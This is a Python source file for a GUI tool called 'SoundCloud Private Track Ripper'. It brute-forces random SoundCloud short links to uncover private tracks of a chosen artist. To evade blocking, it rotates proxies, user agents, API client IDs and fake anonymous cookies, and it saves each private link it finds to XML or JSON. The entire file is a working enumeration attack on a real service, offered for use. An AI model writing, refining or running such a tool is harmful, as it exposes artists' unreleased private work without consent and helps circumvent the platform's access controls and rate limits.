import argparse
import asyncio
import re
import os
import json
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, urlunparse
import random
import string
import time
import threading

try:
    from colorama import Fore
except ModuleNotFoundError:
    print("[Error] The 'colorama' module is not installed. Please install it by running 'pip install colorama'.")
    exit(1)

try:
    import aiohttp
except ModuleNotFoundError:
    print("[Error] The 'aiohttp' module is not installed. Please install it by running 'pip install aiohttp'.")
    exit(1)

try:
    import tkinter as tk
    from tkinter import simpledialog
    from tkinter import messagebox, filedialog
except ModuleNotFoundError:
    print("[Error] The 'tkinter' module is not installed. Please install it by running 'pip install tk'.")
    exit(1)

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1'
]

PROXIES = []
CLIENT_IDS = []
CONFIG_FILE = "config.json"

#=====================CORE=====================================>
#==============================================================>>
async def fetch_url(session, url):
    try:
        async with session.get(url, allow_redirects=False) as response:
            if response.status == 302:  # Found a redirect
                location = response.headers.get('Location')
                if location:
                    return location
            return None
    except Exception as e:
        print(Fore.RED + f"[!] Exception occurred while fetching URL: {e}" + Fore.RESET)
        return None

async def fetch_track_details(session, track_url, retries=3):
    cookies = {
        'sc_anonymous_id': ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    }
    client_id = random.choice(CLIENT_IDS) if CLIENT_IDS else None
    resolve_url = f"https://api.soundcloud.com/resolve?url={track_url}&client_id={client_id}"
    for attempt in range(retries):
        headers = {
            'Accept': 'application/json',
            'User-Agent': random.choice(USER_AGENTS),
            'Referer': 'https://soundcloud.com'
        }
        proxy = random.choice(PROXIES) if PROXIES else None
        try:
            async with session.get(resolve_url, headers=headers, cookies=cookies, proxy=proxy) as response:
                if response.status == 200:
                    track_details = await response.json()
                    return track_details
                elif response.status == 403:
                    print(Fore.RED + f"[!] Failed to fetch track details: HTTP 403 (Forbidden). Attempt {attempt + 1} of {retries}" + Fore.RESET)
                    if attempt < retries - 1:
                        await asyncio.sleep(random.uniform(3, 6))  # Increased delay before retrying
                else:
                    print(Fore.RED + f"[!] Failed to fetch track details: HTTP {response.status}" + Fore.RESET)
                    return None
        except aiohttp.ContentTypeError as e:
            print(Fore.RED + f"[!] Unexpected content type when fetching track details: {e}" + Fore.RESET)
            return None
        except Exception as e:
            print(Fore.RED + f"[!] Exception occurred while fetching track details: {e}" + Fore.RESET)
            return None
    return None

async def validate_proxies():
    valid_proxies = []
    async with aiohttp.ClientSession() as session:
        for proxy in PROXIES:
            try:
                async with session.get('http://www.google.com', proxy=proxy, timeout=5) as response:
                    if response.status == 200:
                        valid_proxies.append(proxy)
                        print(Fore.GREEN + f"[+] Valid proxy: {proxy}" + Fore.RESET)
            except Exception as e:
                print(Fore.YELLOW + f"[-] Invalid proxy: {proxy}. Error: {e}" + Fore.RESET)
    return valid_proxies

async def brute_force_links(artist_url, client_id, threads, session, stop_event):
    matched_urls = []
    total_requests = 0

    artist_username = artist_url.strip('/').split('/')[-1].lower()

    while not stop_event.is_set():
        random_code = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        shortened_url = f"https://on.soundcloud.com/{random_code}"
        resolved_url = await fetch_url(session, shortened_url)
        total_requests += 1

        if resolved_url:
            track_details = await fetch_track_details(session, resolved_url)
            if track_details and 'user' in track_details:
                track_artist_username = track_details['user']['username'].lower()
                # Check if the track belongs to the specified artist
                if track_artist_username == artist_username and track_details.get('sharing') == 'private':
                    matched_urls.append(resolved_url)
                    print(Fore.GREEN + f"[+] Found private track for artist: {resolved_url}" + Fore.RESET)
                else:
                    print(Fore.YELLOW + f"[-] Found public track or no redirect: {resolved_url}" + Fore.RESET)
            else:
                print(Fore.RED + f"[!] Failed to fetch track details for {resolved_url}" + Fore.RESET)
        else:
            print(Fore.RED + f"[!] No redirect for {shortened_url}" + Fore.RESET)

        # Throttle requests to avoid rate limiting
        await asyncio.sleep(1)

    return matched_urls, total_requests

async def main(artist_url, threads, client_id, xml_export_flag, json_export_flag, stop_event, test_url=None):
    print(Fore.LIGHTGREEN_EX + "\n[!] Harvesting private tracks by brute-forcing shortened SoundCloud links...\n" + Fore.RESET)

    # Validate proxies before starting
    global PROXIES
    PROXIES = await validate_proxies()

    async with aiohttp.ClientSession() as session:
        if test_url:
            # Test the provided URL to see if it is a private track for the artist
            resolved_url = await fetch_url(session, test_url)
            if resolved_url:
                track_details = await fetch_track_details(session, resolved_url)
                if track_details and 'user' in track_details:
                    track_artist_username = track_details['user']['username'].lower()
                    artist_username = artist_url.strip('/').split('/')[-1].lower()
                    if track_artist_username == artist_username and track_details.get('sharing') == 'private':
                        print(Fore.GREEN + f"[+] Verified private track for artist: {resolved_url}" + Fore.RESET)
                    else:
                        print(Fore.YELLOW + f"[-] The provided URL does not belong to a private track for the specified artist." + Fore.RESET)
                else:
                    print(Fore.RED + f"[!] Failed to fetch track details for the provided URL." + Fore.RESET)
            else:
                print(Fore.RED + "[!] No redirect found for the provided URL." + Fore.RESET)
            return

        matched_urls, total_requests = await brute_force_links(artist_url, client_id, threads, session, stop_event)

    #===================ON PROGRAM FINISH========================================================
    print(Fore.YELLOW + f"\n[!] Finished! {len(matched_urls)} private tracks found on {total_requests} requests <3" + Fore.RESET)

    if xml_export_flag:
        xml_export(matched_urls)
    if json_export_flag:
        json_export(matched_urls)

#=======================additional functions=====================================================================
def xml_export(links):
    print(Fore.MAGENTA + "\n[+] XML export...")
    data = ET.Element("data")
    if not os.path.exists("output.xml"):
        print(Fore.MAGENTA + "[+] Creating 'output.xml'...")
        data = ET.Element("data")
    else:
        tree = ET.parse("output.xml")
        data = tree.getroot()

    for link in links:
        random_name = link.split("/")[-3]
        user_element = next((user for user in data.findall("user") if user.get("name") == random_name), None)

        if user_element is None:
            user_element = ET.Element("user")
            user_element.set("name", random_name)
            data.append(user_element)

        link_element = ET.Element("link")
        link_element.text = link
        user_element.append(link_element)
    ET.ElementTree(data).write("output.xml", encoding="utf-8", xml_declaration=True)
    print(Fore.GREEN + "\n[+] Done!\n")

def json_export(links):
    print(Fore.MAGENTA + "\n[+] JSON export...")
    data = {}
    if os.path.exists("output.json"):
        with open("output.json", "r") as f:
            data = json.load(f)
    for link in links:
        random_name = link.split("/")[-3]
        if random_name not in data:
            data[random_name] = []
        data[random_name].append(link)
    with open("output.json", "w") as f:
        json.dump(data, f, indent=4)
    print(Fore.GREEN + "\n[+] Done!\n")

#=======================TKINTER UI=====================================================================
class SoundCloudRipperApp:
    def __init__(self, root):
        self.root = root
        self.root.title("SoundCloud Private Track Ripper")
        self.root.geometry("600x400")

        self.artist_url = tk.StringVar()
        self.client_id = tk.StringVar()
        self.threads = tk.IntVar(value=1)
        self.test_url = tk.StringVar()
        self.proxy_file_path = tk.StringVar()
        self.stop_event = asyncio.Event()

        self.load_config()

        tk.Label(root, text="Artist URL:").grid(row=0, column=0, sticky=tk.W, padx=10, pady=5)
        tk.Entry(root, textvariable=self.artist_url, width=50).grid(row=0, column=1, padx=10, pady=5)

        tk.Label(root, text="Client ID (or multiple, comma-separated):").grid(row=1, column=0, sticky=tk.W, padx=10, pady=5)
        tk.Entry(root, textvariable=self.client_id, width=50).grid(row=1, column=1, padx=10, pady=5)

        tk.Label(root, text="Threads:").grid(row=2, column=0, sticky=tk.W, padx=10, pady=5)
        tk.Entry(root, textvariable=self.threads, width=10).grid(row=2, column=1, sticky=tk.W, padx=10, pady=5)

        tk.Label(root, text="Proxy File:").grid(row=3, column=0, sticky=tk.W, padx=10, pady=5)
        tk.Entry(root, textvariable=self.proxy_file_path, width=50).grid(row=3, column=1, padx=10, pady=5)
        tk.Button(root, text="Select Proxy File", command=self.load_proxy_file).grid(row=3, column=2, padx=10, pady=5)

        tk.Label(root, text="Test Private Track URL:").grid(row=4, column=0, sticky=tk.W, padx=10, pady=5)
        tk.Entry(root, textvariable=self.test_url, width=50).grid(row=4, column=1, padx=10, pady=5)

        tk.Button(root, text="Start", command=self.start).grid(row=5, column=0, padx=10, pady=10)
        tk.Button(root, text="Stop", command=self.stop).grid(row=5, column=1, padx=10, pady=10)

    def load_config(self):
        if os.path.exists(CONFIG_FILE):
            with open(CONFIG_FILE, "r") as f:
                config = json.load(f)
                self.artist_url.set(config.get("artist_url", ""))
                self.client_id.set(config.get("client_id", ""))
                self.threads.set(config.get("threads", 1))
                self.proxy_file_path.set(config.get("proxy_file_path", ""))

    def save_config(self):
        config = {
            "artist_url": self.artist_url.get(),
            "client_id": self.client_id.get(),
            "threads": self.threads.get(),
            "proxy_file_path": self.proxy_file_path.get()
        }
        with open(CONFIG_FILE, "w") as f:
            json.dump(config, f, indent=4)

    def load_proxy_file(self):
        file_path = filedialog.askopenfilename(title="Select Proxy File", filetypes=[("Text Files", "*.txt")])
        if file_path:
            self.proxy_file_path.set(file_path)
            self.load_proxies_from_file(file_path)

    def load_proxies_from_file(self, file_path):
        global PROXIES
        with open(file_path, "r") as f:
            PROXIES = [line.split(",")[0] + ":" + line.split(",")[8] for line in f.readlines() if line.strip()]

    def start(self):
        self.save_config()
        self.stop_event.clear()
        artist_url = self.artist_url.get()
        threads = self.threads.get()
        client_ids = self.client_id.get().split(",")
        global CLIENT_IDS
        CLIENT_IDS = [client_id.strip() for client_id in client_ids]
        test_url = self.test_url.get()

        threading.Thread(target=self.run_asyncio_loop, args=(artist_url, threads, test_url)).start()

    def run_asyncio_loop(self, artist_url, threads, test_url):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(main(artist_url, threads, CLIENT_IDS, False, False, self.stop_event, test_url))

    def stop(self):
        self.stop_event.set()

if __name__ == "__main__":
    root = tk.Tk()
    app = SoundCloudRipperApp(root)
    root.mainloop()